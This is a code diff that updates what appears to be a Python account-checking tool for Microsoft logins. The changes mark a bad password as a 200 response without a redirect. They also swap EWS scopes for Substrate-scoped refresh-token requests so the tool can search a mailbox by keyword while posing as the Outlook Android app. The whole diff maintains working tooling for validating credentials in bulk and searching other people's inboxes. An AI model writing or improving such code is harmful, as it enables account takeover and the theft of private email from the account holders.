@@ -664,6 +664,7 @@ _MSFT_SCOPE_EWS   = (
     "offline_access https://outlook.office.com/IMAP.AccessAsUser.All "
     "https://outlook.office.com/SMTP.Send https://outlook.office.com/EWS.AccessAsUser.All"
 )
+_MSFT_SCOPE_SUBSTRATE = "offline_access https://substrate.office.com/.default"
 _MSFT_MSAL_HDR = {
     "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
     "User-Agent": _MSFT_UA_MSAL,
@@ -781,16 +782,11 @@ def _msft_submit_creds(session, url_post: str, ppft: str, nonce: str,
     if r.status_code == 429:
         return None
     location = r.headers.get("Location", "")
+    # 2026-09: MS returns 302+Location only on SUCCESS. On bad password it now
+    # returns 200 + a re-rendered login page carrying sErrTxt (no redirect).
+    # Treat any 200-without-Location as bad password — do NOT retry forever.
     if not location and r.status_code == 200:
-        act = re.search(r'action="([^"]+)"', r.text)
-        if act:
-            fields = re.findall(r'name="([^"]+)"\s+value="([^"]*)"', r.text)
-            try:
-                r2 = session.post(act.group(1), data={k: v for k, v in fields},
-                                   allow_redirects=True, timeout=_MSFT_TIMEOUT)
-                location = r2.url
-            except Exception:
-                pass
+        return None
     if not location:
         return None
     code = _up.parse_qs(_up.urlparse(location).query).get("code", [""])[0]
@@ -880,10 +876,12 @@ def _msft_search_inbox(session, refresh_token: str, email: str,
     if keyword:
         parts.append(keyword)
     query_string = " ".join(parts) if parts else "*"
+    # 2026-09: EWS/IMAP scopes are no longer grantable for this client_id
+    # (AADSTS70000). The Substrate search API accepts the substrate scope token.
     r = session.post(
         f"https://login.microsoftonline.com/{_MSFT_TENANT_ID}/oauth2/v2.0/token",
         data={"client_id": _MSFT_CLIENT_ID, "refresh_token": refresh_token,
-              "scope": _MSFT_SCOPE_EWS, "grant_type": "refresh_token"},
+              "scope": _MSFT_SCOPE_SUBSTRATE, "grant_type": "refresh_token"},
         headers=_MSFT_MSAL_HDR, timeout=_MSFT_TIMEOUT,
     )
     at = r.json().get("access_token", "") if r.status_code == 200 else ""
@@ -891,7 +889,7 @@ def _msft_search_inbox(session, refresh_token: str, email: str,
         return 0
     try:
         r2 = session.post(
-            "https://outlook.office.com/search/api/v2/query",
+            "https://substrate.office.com/search/api/v2/query",
             params={"n": "50", "cv": "tNZ1DVP5NhDwG%2FDUCelaIu.124"},
             json={
                 "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
@@ -923,7 +921,6 @@ def _msft_search_inbox(session, refresh_token: str, email: str,
                 "Accept": "application/json",
                 "Authorization": f"Bearer {at}",
                 "Content-Type": "application/json",
-                "Host": "outlook.office.com",
                 "User-Agent": "Outlook-Android/4.618.3",
                 "X-AnchorMailbox": f"UPN:{email}",
             },
